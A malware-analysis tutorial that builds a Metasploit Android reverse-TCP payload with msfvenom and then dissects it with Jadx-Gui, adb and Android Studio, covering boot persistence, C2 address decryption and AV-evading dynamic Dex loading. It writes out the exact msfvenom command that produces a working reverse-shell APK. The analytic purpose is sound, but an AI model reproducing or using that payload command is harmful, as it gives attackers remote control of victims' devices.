# Analysing MSFVenom Android Payload (Malware)

MSFVenom is one of the most popular framework to create payloads, shellcodes, etc. I want to analyse a little bit a MSFVenom Android payload. So
<p align="center">
<img src="https://user-images.githubusercontent.com/36133745/164783235-d8df38a6-e0f3-4e68-9f64-57fa21b98435.gif">
</p>

## ðŸŽ¬ Part 1 - Creating an Android payload with MSFVenom
Run your Kali Linux distibution (I use vagrant kalilinux/rolling box) and open a terminal.
```bash
# Installing Kali Linux Box
vagrant box add kalilinux/rolling

# Create a Kali Linux VM
mkdir -p /home/$USER/Desktop/vagrantmachines/kali
cd /home/$USER/Desktop/vagrantmachines/kali
vagrant init kalilinux/rolling

# Set Kali Network to Bridge
# Add below line into Vagrantfile file below config.vm.box = "kalilinux/rolling"
  config.vm.network "public_network"
# Save and Exit from Vagrantfile

# Execute Kali Machine
vagrant up

# SSH to Kali Machine
vagrant ssh

# If you want to turn it off just execute below command after you exit from ssh
vagrant halt
```

Simply execute below command.
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=$(ip addr show eth0 | grep -Po 'inet \K[\d.]+') LPORT=1337 > malicious.apk
```
* `-p`: choosing payload
* `LHOST`: listener IP address (C2)
* `LPORT`: listener Port number (C2)
* `> malicious.apk`: output of executed command (attacker payload)

After that, I copy **malicious.apk** to `/vagrant` which let me to access it from my computer.
```bash
cp malicious.apk /vagrant
```
## ðŸŽ¬ Part 2 - Static Analysis with Jadx-Gui

Now I have **malicious.apk** besides **Vagrantfile**. Let's start static analysis.
Open it with Jadx-Gui. Let's see what AndroidManifest.xml does have for us.

![1](https://user-images.githubusercontent.com/36133745/166328267-ec5c9ddb-8230-46af-a575-adfddb1e6d27.png)

We have an activity called `MainActivity` (package: `com.metasploit.stage`) which is our first activity that'll execute.

![2](https://user-images.githubusercontent.com/36133745/166329390-42daa913-cba3-47cf-a4a4-2e2a4c920286.png)

We can also see there is a `BroadcastReceiver` with `android.intent.action.BOOT_COMPLETED` action. It is obvious that this malware use this permission to execute itself after restarting mobile.

![3](https://user-images.githubusercontent.com/36133745/166330015-7593e85c-5e8b-41fc-8b68-32822610297c.png)

Let's have a look at `MainActivity`. It simply calls `startService()` method from `MainService` class.

![4](https://user-images.githubusercontent.com/36133745/166330313-13e44b33-d638-415b-8e96-2b58dd130cce.png)

`MainService` class extended (inherited) from Service, so it's a service that we are dealing with.

![5](https://user-images.githubusercontent.com/36133745/166335467-a7932269-6aeb-466d-b9a2-564b14362811.png)

In this method again `startService` function called, but as we said we are in a service and it calls `MainService.class` in `Intent()`.
```java
public static void startService(Context context) {
    context.startService(new Intent(context, MainService.class));
}
```

So this time `onStartCommand()` method will call. `onStartCommand()` is called every time a client starts the service using `startService(Intent intent)`.

![6](https://user-images.githubusercontent.com/36133745/166336169-c9477814-cce5-4b93-88a8-65e24d209fd1.png)

This method, calls `start()` from `Payload` class. Now let's go deeper and see what `start()` method does.

![7](https://user-images.githubusercontent.com/36133745/166661952-7600a5cf-7f6d-439a-9e00-56d015cabfc1.png)

`start()` function calls `startInPath()` function, and `startInPath()` function calls `e().start()` that lead us to analyse that class and method.

![8](https://user-images.githubusercontent.com/36133745/166662358-72e3cd42-f85c-4539-9df1-311b01198ed2.png)

There is nothing but execute `main()` method from `Payload` class again. We have to back where we were and analyze `main()` function.

![9](https://user-images.githubusercontent.com/36133745/166662629-60f69553-b52f-451d-95b3-54b8dca90517.png)

It's a huge function that can't be even fit in one screenshot. We can see there is a `Socket socket` which indicates we are dealing with a socket connection that's probably attacker C2. Also there is a line contains `a a2 = b.a(a);`. It passes `a` variable to `b.a()` method and save results in `a2`. Left-click on `a` parameter and press `d` on your keyboard (that is a shortcut to get you where variable is decalred).

![10](https://user-images.githubusercontent.com/36133745/166663408-d2ac014a-df8f-429f-aa2c-00d5f090a1e9.png)

It seems a huge array which i guess it can be an IP address or an URL. To make sure of this, I go to `b.a()` method.

![11](https://user-images.githubusercontent.com/36133745/166663788-8a4c2e27-2b9d-4e75-b698-266b7faf0ef0.png)

Again it's a huge function, but this is obvious it decrypts that array. I don't want to waste of my time and try to understand that algorithm, I'll deal with it in dynamic analysis part. But we have to figure it out where it stores the decrypted data. You can see `gVar` everywhere in this function.

![12](https://user-images.githubusercontent.com/36133745/166664915-cee79b68-cb99-46dd-bc10-af7a29f91f48.png)

If you open `g()` class, you can see there is nothing but bunch of variables. Now I'm sure it stores the decrypted data in that class's variables.

![13](https://user-images.githubusercontent.com/36133745/166665135-c1c47aa9-a4d6-416a-9abc-cce98874e327.png)

In the `Payload.main()`, after that decryption method, we can see bunch of `while(){}`, `try{}` and `if(){}`.

![14](https://user-images.githubusercontent.com/36133745/166667336-c7e6bacd-461b-497c-864d-919407e9e453.png)

Take a look at where I pointed (ofc with red arrow).

![15](https://user-images.githubusercontent.com/36133745/166668085-a8945a36-98e1-4715-b294-7dc6957edf14.png)


You can see we have a `socket.getOutputStream()` there that passed to `a()`. If you go to where `a()` declared, you see there's `getClassLoader()`. This method let you load the Dex file dynamically. It uses to bypass AV, besides it makes APK file size smaller.

Overall, this APK file connects to attacker C2 (MSFVenom) and downloads a Dex (or JAR) file, loads it and after that, it will be deleted. Now Let's continue our journey in dynamic analysis part.

## ðŸŽ¬ Part 3 - Dynamic Analysis

First of all, I use `adb` to install our payload.
```shell
adb install malicious.apk
```
Now for the second step of dynamic analysis, I want to extract attacker C2 IP address. As we saw in static analysis, decrypted attacker IP address is in the `g()` class. Let's dump data from that class. I use **Android Studio** to do this. But an important things that worth to mention is "We have to do this quickly before malware close itself and run itself as a service", because you saw it creates a service after exectuion. Make sure your USB Debuggign is enabled.

![16](https://user-images.githubusercontent.com/36133745/166671370-f434b2af-8130-4f7c-836b-f10a8b211d5f.png)

But we have to do one thing more before debugging. We have to make this malicious APK debuggable. To do this as easy as possible, I do this with **[APKLab](https://github.com/APKLab/APKLab)**. The installation steps explained in **[APKLab Github](https://github.com/APKLab/APKLab)**.

Now open malicious APK file with APKLab, Then Right-click on `apktool.yml` and Left-click on `APKLab: Rebuild the APK`.

![18](https://user-images.githubusercontent.com/36133745/166682924-ea6c990f-9445-48f8-b3f6-fc87a6797b9d.png)


Open **Android Studio** and choose **Profile or Debug APK**.

![17](https://user-images.githubusercontent.com/36133745/166672132-90e6ce28-5444-4675-baba-527b93b11960.png)


Now instead of sending 10 images, I would rather to make a GIF to show the process how to extract data from `g()` class.


